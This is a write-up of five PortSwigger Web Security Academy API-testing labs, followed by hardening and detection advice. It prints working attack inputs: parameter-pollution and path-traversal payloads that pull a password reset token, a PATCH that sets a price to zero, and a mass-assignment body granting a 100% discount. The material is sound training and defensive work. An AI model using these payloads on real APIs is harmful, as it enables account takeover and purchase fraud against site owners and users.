# PortSwigger API Testing 1-5 — Contract Drift Is Attack Surface

This is a consolidated walkthrough of the five PortSwigger API Testing labs.

All labs were completed in the authorized Web Security Academy environment. The main lesson is that API bugs often appear where the real backend contract is wider than the frontend contract: documentation, methods, fields, parameters, and internal paths.

## 1. Overview

| # | Lab | Flaw | Core idea |
|---|-----|------|-----------|
| 1 | API endpoint using documentation | exposed interactive docs | walk from `/api/user/wiener` to `/api`, then use documented DELETE |
| 2 | parameter pollution in query string | username is concatenated into an internal query string | inject `%26field=reset_token%23` to retrieve a reset token |
| 3 | unused API endpoint | hidden `PATCH` method changes product price | discover `PATCH` with `OPTIONS`, send `{"price":0}` |
| 4 | mass assignment | checkout accepts hidden `chosen_discount` | copy response-only field into POST body and set 100% discount |
| 5 | parameter pollution in REST URL | username is concatenated into an internal path | traverse to API definition, then inject `/field/passwordResetToken` |

## 2. Triage model

API testing should compare the visible contract with the backend contract:

1. Walk paths upward: `/api/user/wiener` -> `/api/user` -> `/api`.
2. Look for docs: `/api`, `/openapi.json`, `/swagger`, `/api-docs`.
3. Test methods: `OPTIONS`, `PATCH`, `PUT`, `DELETE`.
4. Diff response JSON against request JSON.
5. Test server-side parameter pollution with encoded `&`, `#`, and `?`.
6. Test REST path pollution with `./`, `../`, and encoded fragments.

## 3. Documentation and hidden methods

The documentation lab starts with:

```http
PATCH /api/user/wiener
```

Removing path segments reaches `/api`, which exposes interactive documentation. The documented user DELETE operation accepts `carlos`.

The unused endpoint lab starts from:

```http
GET /api/products/1/price
```

`OPTIONS` reveals `PATCH`. Error messages then guide the request shape:

```http
Content-Type: application/json
```

```json
{"price":0}
```

The jacket can then be purchased for zero.

## 4. Server-side parameter pollution

In the query-string lab, the public password-reset endpoint calls an internal API. Encoded separators show that `username` is being concatenated into an internal query string:

```text
username=administrator%26x=y
username=administrator%23
username=administrator%26field=email%23
```

Once `field=email` is confirmed, switch to the reset-token field:

```text
username=administrator%26field=reset_token%23
```

In the REST-path lab, the same idea applies to path segments:

```text
username=administrator%23
username=administrator%3F
username=./administrator
username=../administrator
```

Traversal to `openapi.json` reveals:

```text
/api/internal/v1/users/{username}/field/{field}
```

The final payload pivots into the intended internal route:

```text
username=../../v1/users/administrator/field/passwordResetToken%23
```

## 5. Mass assignment

The checkout lab compares:

- `GET /api/checkout`;
- `POST /api/checkout`.

The GET response contains a hidden field that the POST request omits:

```json
"chosen_discount": {"percentage": 0}
```

Adding it to the POST body is accepted:

```json
{
  "chosen_discount": {"percentage": 100},
  "chosen_products": [
    {"product_id": "1", "quantity": 1}
  ]
}
```

This is mass assignment: a client can write fields that should be server-controlled.

## 6. Defense and detection

Hardening:

- authenticate API documentation and disable interactive admin docs in production;
- build internal URLs with structured URL builders, not string concatenation;
- normalize and allowlist path segments before internal requests;
- enforce authorization per HTTP method;
- deserialize request bodies into allowlisted DTOs;
- separate response models from write models;
- keep price, discount, role, and token fields server-controlled.

Detection:

- normal users requesting `/api`, `/openapi.json`, `/swagger`, or `/api-docs`;
- encoded `&`, `#`, `?`, `../`, or `./` in parameters that feed backend APIs;
- unexpected `OPTIONS`, `PATCH`, `PUT`, or `DELETE` traffic;
- clients submitting response-only fields such as `chosen_discount`, `role`, `isAdmin`, or `price`;
- password-reset flows requesting arbitrary `field` values.

No lab in this series required a Collaborator/OAST channel.
